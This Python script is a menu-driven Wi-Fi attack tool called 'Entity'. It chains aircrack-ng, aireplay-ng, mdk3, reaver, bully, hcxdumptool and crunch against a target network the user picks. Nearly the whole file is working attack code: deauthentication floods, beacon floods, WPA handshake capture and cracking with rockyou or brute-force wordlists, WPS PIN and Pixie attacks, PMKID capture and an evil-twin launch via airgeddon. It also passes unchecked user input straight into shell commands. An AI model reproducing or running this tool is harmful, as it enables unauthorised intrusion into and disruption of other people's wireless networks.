# coding: utf-8
#!/usr/bin/env python

import os
import pyshark
import subprocess
import pyfiglet,time
from subprocess import check_call


RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"


def Root():
    if os.geteuid()!=0:
        print(RED,'[!] Root Privileges Not Found.')
        exit()
    
    else:
        print(GREEN,'[!] Root Privileges Found.')



def Tools_():
    print(CYAN,'[!] Installing Needed Tools.')
    
    tools = os.system('apt-get install mdk3 aircrack-ng hcxdumptool crunch xterm tshark wordlists reaver pixiewps bully wifite')
    time.sleep(1)

    print(GREEN,'\n[!] All Required Tools are Installed.')
    time.sleep(3)
    
    os.system('clear')



def Banner_():
    print(RED)
    ban=pyfiglet.figlet_format('Entity')
    print(ban)
    time.sleep(5)
    
    print("""
    |\     ____
    | \.-./ .-'
     \ _  _(
     | .)(./
     |   \(
     |     \   |
     |   vvv   |
     |  |__    |
    /      `-. |
            naqviO7""")
    
    print('\n')
    time.sleep(3)

    print(GREEN,'-'*50)
    
    print('\tE\tN\tT\tI\tT\tY')
    print('-'*50)



def Menu_():
    menu_="""
    [1]  Start Monitor Mode       
    [2]  Stop Monitor Mode                        
    [3]  Scan Networks                            
    [4]  Getting Handshake                [!] Monitor Mode Required  
    [5]  Crack Handshake With Rockyou     [!] HandShake Required
    [6]  Crack Handshake without WordList [!] Handshake, ESSID Required                                    
    [7]  Scan for WPS Networks            [!] Monitor Mode Required
    [8]  WPS Networks attacks             [!] BSSID, Monitor Mode Required
    [9]  Deauth Attack                    [!] Monitor Mode Required
    [10] Beacon Flood Attack              [!] Monitor Mode Required
    [11] TCP Dump                         [!] Monitor Mode Not Required
    [12] PKMID Attacks                    [!] Monitor Mode Required
    [13] WPS PIN Crack                    [!] Monitor Mode Required
    [0]  Exit
    """
    print(CYAN,menu_)



def MonMode():
    print('\n[!] Enter Interface, Default:(wlan0/wlan1).')
    interface = input('[!] Interface: ')
        
    order = "airmon-ng start {}".format(interface)
    geny = os.system(order)
    
    Menu_()
        


def StopMonMode():
    print('\n[!] Enter Interface, Default:(wlan0mon/wlan1mon).')
    interface = input('[!] Interface: ')
        
    order = "airmon-ng stop {}".format(interface)
    geny = os.system(order)
    
    Menu_()    



def ScanNetworks():
    print('\n[!] Enter Interface, Default:(wlan0mon/wlan1mon).')
    interface = input('[!] Interface: ')

    order = "airodump-ng {} -M".format(interface)
    print('\n[!] Press [CTRL + C] To Stop Scans.')
    time.sleep(3)

    geny  = os.system(order)

    time.sleep(10)

    Menu_()



def GetHandShake():
    print('\n[!] Enter Interface, Default:(wlan0mon/wlan1mon).')
    interface = input('[!] Interface: ')
    order = "airodump-ng {} -M".format(interface)
    
    print("""
    -------------------------------------------------------------------------------
    Note: Under Probe it might be Passwords So copy them to the WordList File.
    Don't Attack The Network if its Data is ZERO.
    You Can use 's' to Arrange Networks.
    --------------------------------------------------------------------------------
    """)
    
    time.sleep(7)
    geny = os.system(order)

    print('\n[!] Enter BSSID of Target.')
    bssid = str(input('[!] BSSID: '))

    print('\n[!] Enter Channel of Target.')
    channel = int(input('[!] Channel: '))

    print('\n[!] Enter Path of Output File.')
    path=str(input('[!] Path: '))

    print("\n[!] Enter the number of the packets [1-10000]")
    dist=int(input('[!] Packets: '))

    order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
    
    print('\n[!] Press [CTRL + C] To Stop [!] \n')
    geny = os.system(order)

    Menu_()



def HandShake_Rockyou():
    if  os.path.exists("/usr/share/wordlists/rockyou.txt") == True:
        print('[!] Enter Path of Handshake File.')
        path=str(input('[!] Path: '))
        
        order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
        
        print('\n[!] Press [CTRL + C] To Stop [!] \n')
        print('\n[!] It can Take Upto Hours to Days [!]\n')

        geny  = os.system(order)
        os.system('sleep 1d')


    elif os.path.exists("/usr/share/wordlists/rockyou.txt") == False:
        cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
        print('\nEnter Path of Handshake File.')
        path = str(input('[!] Path: '))

        order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)

        print('\n[!] Press [CTRL + C] To Stop [!] \n')
        print('\n[!] It can Take Upto Hours to Days [!]\n')

        geny  = os.system(order)
        os.system('sleep 1d')

    Menu_()



def HandShake_Simple():
    print('\n[!] Enter ESSID of Target.')
    essid=str(input('[!] ESSID: '))

    print('\n[!] Enter Path of Handshake File.')
    path = str(input('[!] Path: '))
    
    print("\n[!] Enter Minimum Length of Password (8/64).")
    mini = int(input("[!] Min: "))
    
    print("\n[!] Enter Maximum Length of Password (8/64).")
    max  = int(input("[!] Max: "))
    print("""
    ---------------------------------------------------------------------------------------
    (1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
    (2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
    (3)  Numeric chars                                   (0123456789)
    (4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
    (5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
    (6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
    (7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
    (8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
    (9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
    (10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
    (11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
    (12) Your Own Words and numbers
    -----------------------------------------------------------------------------------------
    Crack Password Could Take Hours,Days,Weeks,Months to complete
    and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
    may reach to Hundreds of TeRa Bits so Be patiant """)

    print("\n[!] Enter Your Choice.")
    set = str(input("[!] Choice: "))
        
    if set == "1":
        test = str("abcdefghijklmnopqrstuvwxyz")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "2":
        test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "3":
        test = str("0123456789")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "4":
        test = str("!#$%/=?{}[]-*:;")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "5":
        test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "6":
        test = str("abcdefghijklmnopqrstuvwxyz0123456789")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "7":
        test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "8":
        test = str("!#$%/=?{}[]-*:;0123456789")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "9":
        test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "10":
        test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "11":
        test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    elif set == "12":
        print("Enter you Own Words and numbers")
        test  = str(input(""))
        order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
        geny  = os.system(order)
        
    else:
        print("\n[!] Not Found [!]")

    print("Copy the Password and Close the tool")
    os.system("sleep 1d") 

    Menu_()



def WPSAttack():
    os.system('clear')
    print("""
    1 -> Reaver
    2 -> Bully
    3 -> wifite (Recommeneded)
    4 -> PixieWps """)

    print("\n[!] Choose Attack(External WIFI Adapter Require)")
    attack = int(input("[!] Attack: "))
        
    if attack == 1:
        print("\n[!] Enter Interface, Default(wlan0mon/wlan1mon).")
        interface = str(input("[!] Interface: "))
            
        print("\n[!] Enter BSSID of Target.")
        bssid = str(input("[!] BSSID: "))
            
        order = ("reaver -i {} -b {} -vv").format(interface,bssid)
        print('\n[!] Press [CTRL + C] To Stop [!] \n')
        geny = os.system(order)
            
        
    elif attack == 2:
        print("\n[!] Enter Interface , Default(wlan0mon/wlan1mon).")
        interface = str(input("[!] Interface: "))

        print("\n[!] Enter BSSID of Target.")
        bssid = str(input("[!] BSSID: "))
            
        print("\n[!] Enter Channel of Target.")
        channel = int(input("[!] Channel: "))

        order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
            
        print('\n[!] Press [CTRL + C] To Stop [!] \n')

        geny = os.system(order)
            
        
    elif attack == 3:
        cmd = os.system("wifite")
        
    elif attack == 4:
        print("\n[!] Enter Interface , Default(wlan0mon/wlan1mon).")
        interface = str(input("[!] Interface: "))

        print("\nEnter BSSID of Target: ")
        bssid = str(input("[!] BSSID: "))
            
        order = ("reaver -i {} -b {} -K").format(interface,bssid)
        print('\n[!] Press [CTRL + C] To Stop [!] \n')
            
        geny = os.system(order)
        
    else :
        print('\n[!] Attack Not Found.')

    Menu_()



def ScanforWPS():
    print("\n[!] Enter Interface, (Default(wlan0mon/wlan1mon).")
    interface = str(input("[!] Interface: "))
    
    order = "airodump-ng -M --wps {}".format(interface)
    
    print('\n[!] Press [CTRL + C] To Stop [!] \n')

    geny = os.system(order)
    os.system("sleep 5 ")
    
    Menu_()



def BeaconFlood():
    print("\n[!] Enter Interface, (Default(wlan0mon/wlan1mon).")
    interface = str(input("[!] Interface: "))

    order = "mdk3 {} b -s 250".format(interface)

    print('\n[!] Press [CTRL + C] To Stop [!] \n')

    print('[!] Attack Started [!] \n')
    geny = os.system(order)

    Menu_()



def Deauth():
    print("\n[!] Enter Interface, (Default(wlan0mon/wlan1mon).")
    interface = str(input("[!] Interface: "))

    print("\n[!] Enter BSSID of Target.")
    bssid = str(input("[!] BSSID: "))

    print("\n[!] Enter Channel of Target.")
    channel=int(input('[!] Channel: '))

    order1="airodump-ng --bssid {} --channel {} {} > /dev/null & sleep 5 ; kill $!".format(bssid,channel,interface)
    order2="aireplay-ng --deauth 0 -a {} {} > /dev/null".format(bssid,interface)

    print('\n[!] Press [CTRL + C] To Stop [!] \n')
    print('[!] Deauth Attack Started [!]\n')
    geny1=os.system(order1)
    geny2=os.system(order2)

    Menu_()



def TcpDump():
    print("\n[!] Enter Interface, (Default(wlan0/eth0).")
    iface_name = str(input("[!] Interface: "))

    print("\n[!] Enter Number of Packets.")
    pack=int(input("[!] Packets: "))

    capture = pyshark.LiveCapture(interface=iface_name)

    print("[!] Listening on %s" % iface_name)

    print("\n[!] Dumping TCP Network Traffic\n")
    for packet in capture.sniff_continuously(packet_count=pack):
        try:
            
            localtime = time.asctime(time.localtime(time.time()))
         
            protocol = packet.transport_layer   
            src_addr = packet.ip.src            
            src_port = packet[protocol].srcport  
            dst_addr = packet.ip.dst            
            dst_port = packet[protocol].dstport 

            print ("%s IP %s:%s <-> %s:%s (%s)" % (localtime, src_addr, src_port, dst_addr, dst_port, protocol))
            input()
        
        except AttributeError as e:
            pass
        print (" ")
    
    Menu_()


def PKMID():
    print("\n[!] Enter Interface, (Default(wlan0mon/wlan1mon).")
    interface = str(input("[!] Interface: "))

    order = "airodump-ng {} -M".format(interface)

    print('\n[!] Press [CTRL + C] To Stop Scans.')
    time.sleep(3)

    geny  = os.system(order)

    print("\n[!] Enter BSSID of Target.")
    bssid = str(input("[!] BSSID: "))

    print("\n[!] Enter Channel of Target.")
    channel=int(input('[!] Channel: '))

    print("\n[!] Enter Path of Output File.")
    path=str(input("[!] Path: "))

    ordr1 = "hcxdumptool -i {} -o {} --enable_status=1 --filterlist_ap={} --filtermode=2".format(interface,path,bssid)
    
    geny1= os.system(ordr1)

    Menu_()



def WPSPIN():
    print("\n[!] Enter Interface, (Default(wlan0mon/wlan1mon).")
    interface = str(input("[!] Interface: "))

    order = "airodump-ng {} -M".format(interface)

    print('\n[!] Press [CTRL + C] To Stop Scans.\n')
    time.sleep(3)

    geny  = os.system(order)

    print("\n[!] Enter BSSID of Target.")
    bssid = str(input("[!] BSSID: "))
    
    print("\n[!] Enter Last 6 Digits Of BSSID.")
    bisd6=str(input("\n[!] Six Digits BSSID: "))

    print("\n[!] Enter Channel of Target.")
    channel=int(input('[!] Channel: '))

    order1="reaver -i {} -c {} -b {} -p {} -vv".format(interface,channel,bssid,bisd6)

    geny1= os.system(order1)

    Menu_()



if __name__ == '__main__':
    time.sleep(3)
    os.system('clear')

    #Root()
    time.sleep(3)
    os.system('clear')

    time.sleep(3)
    Tools_()
    os.system('clear')

    time.sleep(3)
    os.system('clear')
    Banner_()

    time.sleep(3)
    Menu_()
    
    opt = ''
    while opt != 0:
        opt = input('entity > ')
        
        if opt == '1':
            time.sleep(3)
            os.system('clear')

            print(RESET)
            print('*'*45)
            print('\n[!] S T A R T M O N I T E R M O D E [!]\n')
            print('*'*45)
            MonMode()
        
        elif opt == '2':
            time.sleep(3)
            os.system('clear')

            print(RESET)
            print('*'*45)
            print('\n[!] S T O P M O N I T E R M O D E [!]\n')
            print('*'*45)
            StopMonMode()

        elif opt == '3':
            time.sleep(3)
            os.system('clear')

            print(BLUE)
            print('*'*45)
            print('\n[!] S C A N  N E T W O R K S [!]\n')
            print('*'*45)
            ScanNetworks()

        elif opt == '4':
            time.sleep(3)
            os.system('clear')

            print(CYAN)
            print('*'*45)
            print('\n[!] H A N D S H A K E S [!]\n')
            print('*'*45)
            GetHandShake()

        elif opt == '5':
            time.sleep(3)
            os.system('clear')

            print(GREEN)
            print('*'*45)
            print('\n[!] H A N D S H A K E S  R O C K Y O U [!]\n')
            print('*'*45)
            HandShake_Rockyou()

        elif opt == '6':
            time.sleep(3)
            os.system('clear')

            print(RED)
            print('*'*45)
            print('\n[!] H A N D S H A K E S [!]\n')
            print('*'*45)
            HandShake_Simple()

        elif opt == '7':
            time.sleep(3)
            os.system('clear')

            print(BLUE)
            print('*'*45)
            print('\n[!] W P S  S C A N S [!]\n')
            print('*'*45)            
            ScanforWPS()

        elif opt == '8':
            time.sleep(3)
            os.system('clear')

            print(CYAN)
            print('*'*45)
            print('\n[!] W P S  A T T A C K S[!]\n')
            print('*'*45)
            WPSAttack()

        elif opt == '9':
            time.sleep(3)
            os.system('clear')

            print(GREEN)
            print('*'*45)
            print('\n[!] D E A U T H   A T T A C K [!]\n')
            print('*'*45)
            Deauth()

        elif opt == '10':
            time.sleep(3)
            os.system('clear')

            print(RED)
            print('*'*45)
            print('\n[!] B E A C O N   F L O O D   A T T A C K [!]\n')
            print('*'*45)
            BeaconFlood()

        elif opt == '11':
            time.sleep(3)
            os.system('clear')

            print(BLUE)
            print('*'*45)
            print('\n[!] T C P   D U M P [!]\n')
            print('*'*45)
            TcpDump()

        elif opt == '12':
            time.sleep(3)
            os.system('clear')

            print(CYAN)
            print('*'*45)
            print('\n[!] P K M I D    A T T A C K [!]\n')
            print('*'*45)
            PKMID()

        elif opt == '13':
            time.sleep(3)
            os.system('clear')

            print(GREEN)
            print('*'*45)
            print('\n[!] W P S   P I N   A T T A C K [!]\n')
            print('*'*45)
            WPSPIN()     

        elif opt == '14':
            time.sleep(3)
            os.system('clear')

            print(GREEN)
            print('*'*45)
            print('\n[!] E V I L   T W I N    A T T A C K [!]\n')
            print('*'*45)
            
            os.system('airgeddon')
            Menu_()   

        elif opt == '0':
            print(RED)

            print('*'*45)
            print('[!] Q U I T T I N G [!]')
            print('*'*45)

            exit()

        else:
            print(RED)
            print('[!] Option Not Found.')
            
            time.sleep(3)
            print('*'*45)
            print('[!] Q U I T T I N G [!]')
            print('*'*45)

            exit()
#ENDOFTOOL
